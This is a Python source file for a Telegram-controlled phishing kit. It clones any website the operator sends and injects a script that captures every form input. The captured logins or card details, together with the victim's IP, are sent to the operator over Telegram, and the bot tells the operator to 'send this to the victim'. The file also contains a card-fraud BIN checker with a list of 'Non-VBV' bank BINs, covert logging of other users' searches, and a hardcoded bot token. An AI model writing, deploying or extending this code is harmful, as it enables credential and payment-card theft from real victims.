import os
import re
import threading
import requests
from bs4 import BeautifulSoup
from flask import Flask, request, render_template_string
import telebot

TOKEN = '9092673646:AAFyrSSdYznnUAOlC1jR_rZT2-3hsbYkvNI'
ADMIN_ID = 8172701890

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
SESSIONS = {}

# --- LOCAL BIN DATABASE (For specific processors only) ---
# If a bank uses DCS, Valet, DX, or Card Nav, list it here.
# If it's not here, the bot will still look up the bank name via API.
BIN_DB = {
    "449497": {"processor": "DCS", "vbv": "Non-VBV"},       # HAPO
    "415823": {"processor": "DCS", "vbv": "Non-VBV"},       # POLICE FCU
    "514616": {"processor": "Card Nav", "vbv": "Non-VBV"},  # WOODFOREST (You can change to Card Nav)
    "406632": {"processor": "DCS", "vbv": "Non-VBV"},       # LGE
    "463092": {"processor": "Valet", "vbv": "Non-VBV"},     # TOWN & COUNTRY
    "439348": {"processor": "DX", "vbv": "Non-VBV"},        # CNB BANK
    "437795": {"processor": "DCS", "vbv": "Non-VBV"},       # VOYAGE
    "470541": {"processor": "DCS", "vbv": "Non-VBV"},       # CU OF COLORADO
    "429123": {"processor": "DCS", "vbv": "Non-VBV"},       # SIU
    "478820": {"processor": "DCS", "vbv": "Non-VBV"},       # NUMERICA
    "476546": {"processor": "Valet", "vbv": "Non-VBV"},     # BANKPLUS
    "415384": {"processor": "DCS", "vbv": "Non-VBV"}        # GESA
}

@app.route('/<slug>', methods=['GET'])
def serve_page(slug):
    if slug not in SESSIONS:
        return "Link expired or invalid.", 404
    return render_template_string(SESSIONS[slug]['html'])

@app.route('/capture/<slug>', methods=['POST'])
def capture(slug):
    data = request.json
    if not data: return "Error", 400
    
    ip = request.remote_addr
    
    msg = f"🚨 <b>NEW HIT</b> 🚨\n\n<b>Target:</b> {SESSIONS[slug]['url']}\n"
    msg += f"<b>IP:</b> <code>{ip}</code>\n\n"
    
    for key, value in data.items():
        msg += f"<b>{key}:</b> <code>{value}</code>\n"
    
    bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
    return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send `/bin 449497` to check a BIN.", parse_mode='Markdown')

@bot.message_handler(commands=['bin'])
def check_bin(message):
    searcher_id = message.chat.id
    searcher_name = message.from_user.username or message.from_user.first_name or "Unknown"
    
    try:
        bin_num = message.text.split(' ')[1].strip()[:8]
    except IndexError:
        bot.reply_to(message, "Format: `/bin 449497`", parse_mode='Markdown')
        return

    bot.reply_to(message, f"🔍 Checking BIN: `{bin_num}`...", parse_mode='Markdown')
    
    bank = "Unknown"
    brand = "Unknown"
    country = "Unknown"
    processor = "Unknown"
    vbv = "Requires Auth Test"

    # 1. Check Local DB for Processor & VBV
    for known_bin, data in BIN_DB.items():
        if bin_num.startswith(known_bin):
            processor = data["processor"]
            vbv = data["vbv"]
            break

    # 2. Always check the API for the Bank Name, Brand, and Country
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_num}", headers={'Accept-Version': '3'}, timeout=5)
        if r.status_code == 200:
            api_data = r.json()
            bank = api_data.get('bank', {}).get('name', 'Unknown')
            brand = api_data.get('scheme', 'Unknown').upper()
            country = api_data.get('country', {}).get('name', 'Unknown')
    except:
        pass

    reply = f"💳 <b>BIN:</b> <code>{bin_num}</code>\n"
    reply += f"🏦 <b>Bank:</b> {bank}\n"
    reply += f"💠 <b>Brand:</b> {brand}\n"
    reply += f"🌍 <b>Country:</b> {country}\n"
    reply += f"⚙️ <b>Processor:</b> {processor}\n"
    reply += f"🛡️ <b>VBV:</b> <code>{vbv}</code>"
    
    bot.reply_to(message, reply, parse_mode='HTML')

    if searcher_id != ADMIN_ID:
        try:
            log_msg = f"🕵️ <b>BIN Search Log</b>\n\n"
            log_msg += f"👤 <b>User:</b> @{searcher_name} (<code>{searcher_id}</code>)\n"
            log_msg += f"💳 <b>BIN Searched:</b> <code>{bin_num}</code>\n"
            log_msg += f"🏦 <b>Result:</b> {bank}\n"
            log_msg += f"⚙️ <b>Processor:</b> {processor}"
            bot.send_message(ADMIN_ID, log_msg, parse_mode='HTML')
        except Exception as e:
            print(f"Log failed: {e}")

@bot.message_handler(func=lambda message: message.text and message.text.startswith('http'))
def clone_site(message):
    if message.chat.id != ADMIN_ID: return
    url = message.text
    bot.reply_to(message, f"Scraping {url}...")
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'}
        r = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        slug = os.urandom(4).hex()

        script = f"""
        <script>
        document.addEventListener('submit', function(e) {{
            e.preventDefault();
            var data = {{}};
            e.target.querySelectorAll('input').forEach(function(inp) {{
                if(inp.value) data[inp.name || inp.id || inp.placeholder || 'input'] = inp.value;
            }});
            
            fetch('/capture/{slug}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }}).then(function() {{
                alert('Processing... Please wait.');
                window.location.href = '{url}';
            }});
        }});
        </script>
        """
        
        if soup.body:
            soup.body.append(BeautifulSoup(script, 'html.parser'))
        
        base_url = re.match(r'(https?://[^/]+)', url).group(0)
        for tag in soup.find_all(['link', 'script', 'img']):
            if tag.get('href') and tag['href'].startswith('/'):
                tag['href'] = base_url + tag['href']
            if tag.get('src') and tag['src'].startswith('/'):
                tag['src'] = base_url + tag['src']

        SESSIONS[slug] = {'html': str(soup), 'url': url}
        
        host = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
        
        bot.reply_to(message, f"✅ <b>Clone Live!</b>\n\n<code>{host}/{slug}</code>\n\nSend this to the victim.", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Failed: {e}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True).start()
    
    print("Bot is running...")
    bot.infinity_polling()
